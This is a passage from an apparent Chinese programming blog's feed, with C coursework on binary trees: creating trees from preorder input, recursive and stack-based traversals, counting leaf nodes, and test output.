class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的存储：链式存储（不带双亲）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;<span class="comment">//定义结点类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span> <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;  <span class="comment">//根结点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的创建：按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree t)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  <span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------非递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>源文件 <code>test.cpp</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.递归遍历             2.非递归遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> select;</span><br><span class="line">    bintree t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请根据前序遍历结果输入二叉树的 结点值（空子树使用 # 代替）：\n&quot;</span>);</span><br><span class="line">t = createbintree();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">Menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line"><span class="keyword">switch</span>(select)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//递归遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">preorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">inorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">postorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//递归遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">preorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">inorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">postorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/11/ieurZmqRlgCPcGt.png" alt="image-20211111233134578"></p><p>测试以上图 二叉树 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前序遍历结果：abdefgc</span><br><span class="line">    输入：abd#<span class="meta">#ef##g##c##</span></span><br><span class="line">中序遍历结果：dbfegac</span><br><span class="line">后序遍历结果：dfgebca</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/13/IvMHoaLZWmV8TyN.png" alt="image-20211113085744734"></p><p><img src="https://i.loli.net/2021/11/13/8VzkgG5Pq32cKli.png" alt="image-20211113085800931"></p><p><img src="https://i.loli.net/2021/11/13/2mUsZEbpYzlMLHD.png" alt="image-20211113085816823"></p><p><img src="https://i.loli.net/2021/11/13/KWZMfnJghjyIqaD.png" alt="image-20211113085827862"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>Struggling</title>
    <link href="https://xizhi-future.github.io/2021/11/07/Struggling/"/>
    <id>https://xizhi-future.github.io/2021/11/07/Struggling/</id>
    <published>2021-11-07T04:52:59.000Z</published>
    <updated>2021-11-07T04:57:27.852Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/07/Aj7dS1eMpwxmlqH.jpg" alt="1636260982008"><img src="https://i.loli.net/2021/11/07/DUbOPSBcTtnlmCN.jpg" alt="IMG_20211029_205703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>二叉树_题</title>
    <link href="https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/"/>
    <id>https://xizhi-future.github.io/2021/11/06/%E4%BA%8C%E5%8F%89%E6%A0%91-%E9%A2%98/</id>
    <published>2021-11-06T03:34:01.000Z</published>
    <updated>2021-11-14T09:29:03.147Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"><a href="#分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数" class="headerlink" title="分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数"></a>分别采用递归和非递归方式编写两个函数，求一颗给定二叉树中叶子结点的个数</h3><p><strong><code>bintree.h</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> *a; </span><br><span class="line"><span class="comment">/* 如果在定义点之前的函数想引用该全局变量，则应该在引用之前用关键字 extern 对该变量作“外部变量声明”，表示该变量是一个已经定义的外部变量 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//链式存储，不带双亲</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;binnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> binnode *bintree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的 创建</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(bintree *t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = *a++;</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        *t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *t = (bintree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(binnode));</span><br><span class="line">        (*t)-&gt;data = ch;</span><br><span class="line">        create(&amp;(*t)-&gt;lchild);</span><br><span class="line">        create(&amp;(*t)-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//前序 递归 遍历 二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    bintree data[N];</span><br><span class="line">    <span class="keyword">int</span> top;</span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化 顺序栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    s-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top &gt; <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//不为空</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//为空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否 满</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">full</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == N<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">//满</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//不满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!full(s))</span><br><span class="line">        s-&gt;data[++s-&gt;top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!empty(s))</span><br><span class="line">        <span class="keyword">return</span> s-&gt;data[s-&gt;top--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>333.cpp</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归方法求 二叉树 叶子结点的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">return</span> lefts_1(t-&gt;lchild) + lefts_1(t-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归方法 求 二叉树 叶子结点的 个数  (需要使用到顺序栈)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lefts_2</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    init(&amp;s);</span><br><span class="line">    <span class="keyword">while</span>(t || !empty(&amp;s))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!t-&gt;lchild &amp;&amp; !t-&gt;rchild)</span><br><span class="line">                count++;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    bintree t;</span><br><span class="line">    create(&amp;t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_1(t));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;非递归算法：二叉树叶子结点个数---%d\n&quot;</span>,lefts_2(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p><p>以上面的二叉树为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a = <span class="string">&quot;ABD  EF  G  C  &quot;</span>;   <span class="comment">//前序序列</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/06/cMHT2U5hE6zfgjO.png" alt="image-20211106112844209"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>树型结构</title>
    <link href="https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/"/>
    <id>https://xizhi-future.github.io/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/</id>
    <published>2021-10-30T09:48:21.000Z</published>
    <updated>2021-10-30T09:51:16.228Z</updated>
    
